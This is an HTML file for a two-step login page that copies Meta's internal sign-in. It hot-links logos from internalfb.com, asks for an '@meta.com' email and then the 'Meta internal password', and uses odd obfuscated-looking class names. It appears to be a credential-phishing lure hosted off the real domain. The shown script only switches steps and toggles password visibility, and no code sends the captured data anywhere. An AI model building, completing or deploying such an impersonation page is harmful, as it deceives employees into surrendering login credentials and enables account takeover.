<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="https://s-static.internalfb.com/rsrc.php/yC/r/oqI5mAG9UwR.webp" />
  <title>Internal Login</title>
</head>
<body>
  <div class="_ass1">

  <div class="login-step" id="step-1">

    <div class="_ass2">
      <img src="https://www.internalfb.com/intern/images/internalfb/meta.png">
      <span>Welcome</span>
    </div>

    <div class="xrvj5djxgpatz3">
      <label for="work-email">Email</label>

      <input
        type="email"
        id="work-email"
        name="work-email"
        placeholder="e.g. @meta.com"
        autocomplete="email"
      >

      <button type="button" class="next-button" disabled>
        <span class="button-text">Next</span>
        <span class="loading-spinner"></span>
      </button>
    </div>

  </div>
  <div class="login-step step-2" id="step-2">

  <div class="_ass2">
    <img src="https://www.internalfb.com/intern/images/internalfb/meta.png">
    <span>Welcome</span>
  </div>

  <div class="email-pill" id="email-display">
    <span class="email-icon"><img src="/images/user.png"></span>
    <span class="email-text"></span>
    <span class="email-close"><img src="/images/back.png"></span>
  </div>

  <div class="xrvj5djxgpatz3">
    <label for="work-password">Password</label>


<div class="password-wrapper">
  <input 
    type="password" 
    id="password" 
    name="work-password" 
    placeholder="Enter your Meta internal password" 
    autocomplete="current-password"
  >

  <img 
    src="/images/toggle.png" 
    id="password-toggle"
    class="password-toggle"
    alt="Show password"
  >
</div>

      <button type="button" class="next-button" disabled>
        <span class="button-text">Next</span>
        <span class="loading-spinner"></span>
      </button>
  </div>

</div>

</div>
</body>
<style>
  body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: flex-start;
  }
  

  .password-wrapper {
  position: relative;
  width: 356px;
}

.password-wrapper input {
  width: 100%;
  padding-right: 42px;
}

.password-toggle {
  position: absolute;
  right: 5px;
  top: 50%;
  transform: translateY(-50%);

  width: 27px;
  height: 27px;

  object-fit: contain;
  cursor: pointer;
}

.password-toggle:hover {
  background-color: rgba(5, 54, 89, 0.05);
  border-radius: 8px;
}

.email-pill {
  display: flex;
  align-items: center;
  justify-content: space-between;

  width: fit-content;
  min-width: 190px;
  height: 28px;

  margin: 10px auto 0 !important;
  padding: 0 8px;

  box-sizing: border-box;
  background-color: rgba(5, 54, 89, 0.1);
  border-radius: 4px;

  font-family: system-ui, -apple-system, BlinkMacSystemFont, ".SFNSText-Regular", sans-serif;
  font-size: 12px;
  color: rgb(10, 19, 23);
}

.email-icon {
  display: flex;
  align-items: center;
  flex-shrink: 0;
}

.email-icon img {
  height: 22px;
  cursor: default;
}

.email-text {
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;

  color: rgb(10, 19, 23);
  font-weight: 400;
  text-align: center;
  cursor: default;

  margin: 0 8px;
  flex: 1;
}

.email-close {
  display: flex;
  align-items: center;
  flex-shrink: 0;
}

.email-close img {
  height: 12px;
  cursor: pointer;
}
  .login-step {
  width: 100%;
}

.step-2 {
  display: none;
}

.step-content {
  margin: 30px 13px 0;
}

#email-display {
  margin: 0;
  font-family: Helvetica, Arial, sans-serif;
  font-size: 14px;
  color: rgb(78, 96, 111);
}
  .xrvj5djxgpatz3 {
  margin-top: 30px;
  margin-left: 13px;
  padding-bottom: 20px;
}

.xrvj5djxgpatz3 label {
  display: block;
  margin-bottom: 8px;

  color: rgb(78, 96, 111);
  color-scheme: light;
  font-size: 14px;
  font-weight: 500;
  font-family: Helvetica, Arial, sans-serif;
  line-height: 15px;
}

.xrvj5djxgpatz3 input {
  display: block;
  box-sizing: border-box;

  width: 356px;
  height: 36px;

  background-color: rgb(255, 255, 255);
  border: 1px solid rgb(204, 211, 219);
  border-radius: 8px;

  color: rgb(10, 19, 23);
  font-family: system-ui, -apple-system, BlinkMacSystemFont, ".SFNSText-Regular", sans-serif;
  font-size: 14px;
  font-weight: 400;

  padding: 0 12px;
}

.xrvj5djxgpatz3 input::placeholder {
  color: rgb(118, 118, 118);
  font-size: 14px;
  font-weight: 400;
  font-family: Helvetica, Arial, sans-serif;
}

.xrvj5djxgpatz3 input:hover {
  box-shadow: inset 0 0 0 3px rgba(204, 211, 219, .3);
}

.xrvj5djxgpatz3 input:focus {
  border: 1px solid rgb(0, 100, 224);
  outline: none;
  box-shadow: inset 0 0 0 3px rgba(1, 113, 227, .3);
}
.loading-spinner {
  display: none;

  width: 9px;
  height: 9px;

  border: 3px solid rgba(255, 255, 255, 0.45);
  border-top-color: white;

  border-radius: 50%;

  animation: button-spin 0.7s linear infinite;
}


.xrvj5djxgpatz3 .next-button.loading .loading-spinner {
  display: inline-block;
}


@keyframes button-spin {
  to {
    transform: rotate(360deg);
  }
}

.xrvj5djxgpatz3 .next-button {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 6px;

  width: 356px;
  height: 36px;

  margin-top: 16px;
  color-scheme: light;

  border: none;
  border-radius: 8px;

  background-color: rgb(0, 100, 224);
  color: rgb(255, 255, 255);

  font-family: Helvetica, Arial, sans-serif;
  font-size: 14px;
  font-weight: 700;

  cursor: not-allowed;
  opacity: 0.5;

}

.xrvj5djxgpatz3 .next-button:hover {
  background-color: rgb(4, 87, 203);
}


.xrvj5djxgpatz3 .next-button:not(:disabled) {
  cursor: pointer;
  opacity: 1;
}


.xrvj5djxgpatz3 .next-button:not(:disabled):hover {
  background-color: rgb(4, 87, 203);
}


.xrvj5djxgpatz3 .next-button:disabled {
  pointer-events: auto;
}

  ._ass1 {
    width: 380px;
    min-height: 260px;
    height: auto;
    border: 1px solid rgb(218, 221, 225);
    border-radius: 8px;
    margin-top: 40px;
  }
  ._ass2 {
  padding-top: 32px;
  display: flex;
  flex-direction: column;
  align-items: center;
}
  ._ass2 img {
    height: 26px;
  }
  ._ass2 span {
    margin-top: 20px;
    color: rgb(10, 19, 23);
    color-scheme: light;
    font-family: system-ui;
    font-size: 20px;
    font-weight: 600;
    line-height: 26px;
  }
</style>
<script>
const emailInput = document.querySelector("#work-email");
const nextButton = document.querySelector(".xrvj5djxgpatz3 .next-button");

const step1 = document.querySelector("#step-1");
const step2 = document.querySelector("#step-2");
const emailDisplay = document.querySelector("#email-display");

emailInput.addEventListener("input", () => {
  nextButton.disabled = emailInput.value.trim() === "";
});

function goToNextStep() {
  if (nextButton.disabled) return;

  nextButton.disabled = true;
  nextButton.classList.add("loading");

  setTimeout(() => {
    nextButton.classList.remove("loading");

    emailDisplay.querySelector(".email-text").textContent =
     emailInput.value.trim();

    step1.style.display = "none";

    step2.style.display = "block";

  }, 500);
}

nextButton.addEventListener("click", goToNextStep);

emailInput.addEventListener("keydown", (event) => {
  if (event.key === "Enter" && !nextButton.disabled) {
    event.preventDefault();
    goToNextStep();
  }
});
const passwordInput = document.getElementById("password");
const passwordToggle = document.getElementById("password-toggle");

passwordToggle.addEventListener("click", function () {
  if (passwordInput.type === "password") {
    passwordInput.type = "text";
  } else {
    passwordInput.type = "password";
  }
});

const step2NextButton = document.querySelector("#step-2 .next-button");

passwordInput.addEventListener("input", () => {
  step2NextButton.disabled = passwordInput.value.trim() === "";
});
</script>
</html>
